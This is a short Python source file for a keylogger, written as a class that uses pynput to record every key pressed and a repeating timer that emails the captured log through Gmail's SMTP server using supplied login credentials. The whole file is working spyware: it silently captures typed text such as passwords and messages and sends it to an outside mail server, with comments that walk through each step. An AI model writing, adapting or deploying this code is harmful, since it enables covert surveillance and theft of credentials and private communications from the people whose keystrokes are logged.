#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password): # Initialize the script with time interval, email, and password.
        self.log = "Keylogger started"  # Starting message for the log
        self.interval = time_interval  # Set the time interval for reporting the log
        self.email = email  # Email address to send the log to
        self.password = password  # Password for the email account

    def append_to_log(self, string): # Append string to the log
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self): # Send the current log via email and reset the log.
        self.send_mail(self.email, self.password, "\n\n" + self.log)  # Send the log via email
        self.log = ""  # Reset the log after sending
        timer = threading.Timer(self.interval, self.report)  # Create a timer to call report again after the interval
        timer.start()  # Start the timer

    def send_mail(self, email, password, message): # Send an email with the given message.
        server = smtplib.SMTP("smtp.gmail.com", 587)  # Connect to the Gmail SMTP server
        server.starttls()  # Start TLS encryption
        server.login(email, password)  # Log in to the email account
        server.sendmail(email, email, message)  # Send the email (from and to the same address)
        server.quit()  # Disconnect from the server

    def start(self): # Start the keylogger.
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)  # Create a keyboard listener
        with keyboard_listener:  # Use the listener as a context manager
            self.report()  # Start the reporting function
            keyboard_listener.join()  # Join the listener thread to the main thread to keep it running
